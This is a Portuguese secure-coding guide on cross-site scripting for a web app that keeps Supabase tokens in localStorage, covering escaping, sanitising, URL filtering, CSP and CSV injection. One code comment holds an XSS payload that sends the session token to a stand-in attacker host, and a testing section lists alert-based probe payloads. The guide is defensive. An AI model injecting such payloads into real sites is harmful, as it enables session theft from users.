# XSS (Cross-Site Scripting)

**O que é:** o atacante consegue fazer o SEU site executar o código DELE no navegador de outra pessoa. Com isso ele rouba a sessão (token do Supabase fica no `localStorage`), faz compras, troca pontos, muda senha.

**Como acontece:** um texto vindo de fora (nome do usuário, título da oferta, comentário, parâmetro da URL, resposta da IA) é colocado no HTML sem ser "desarmado".

```js
// ERRADO: se nome = <img src=x onerror="fetch('//mau.site?t='+localStorage.getItem('sb-...'))">
lista.innerHTML = `<li>${usuario.nome}</li>`;
```

## Defesas (em camadas)

1. **Prefira APIs que já tratam como texto**: `el.textContent = valor`, `document.createElement`, `{valor}` no React/Vue/Svelte (sem `dangerouslySetInnerHTML`, `v-html`, `{@html}`).
2. **Quando montar HTML como texto, escape TUDO que vem de fora:**
   ```js
   const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
   lista.innerHTML = `<li>${esc(usuario.nome)}</li>`;
   ```
   - Números: `Number(x)`. Constantes do próprio código não precisam.
   - Dentro de atributo `onclick="f('${...}')"` o escape HTML **não basta** (o navegador desfaz `&#39;` antes de rodar o JS). Passe só IDs validados (uuid, `^[A-Z0-9]+$`) ou guarde o valor numa variável/`data-*` e leia no handler.
3. **Precisa aceitar HTML do usuário (editor de texto rico)?** Sanitize com DOMPurify (versão fixa + SRI): `el.innerHTML = DOMPurify.sanitize(html)`.
4. **URLs vindas de fora**: aceite só `https://` (bloqueia `javascript:` e `data:`):
   ```js
   const seguro = u => /^https:\/\//.test(String(u||"")) ? u : "";
   ```
5. **Nunca** `eval`, `new Function`, `setTimeout("texto")`, `document.write`.
6. **CSP (Content-Security-Policy)** no servidor como segunda barreira: limita de onde scripts podem vir e para onde dados podem ir (`connect-src`). Veja [netlify.md](netlify.md). `'unsafe-inline'` enfraquece; para endurecer, mova JS para arquivos `.js` e use `addEventListener`.
7. **Links externos**: `rel="noopener noreferrer"` em `target="_blank"`.
8. **Exportar CSV/Excel**: células que começam com `= + - @` viram fórmula ("CSV injection"). Prefixe com `'`.

## Como testar

Em todo campo de texto (nome, título, descrição, busca, endereço), salve:
```
<img src=x onerror=alert(document.domain)>
"><svg onload=alert(1)>
'));alert(1);//
```
Abra todas as telas onde o valor aparece (inclusive painel do admin e da empresa). Nada pode executar; o texto deve aparecer literalmente.
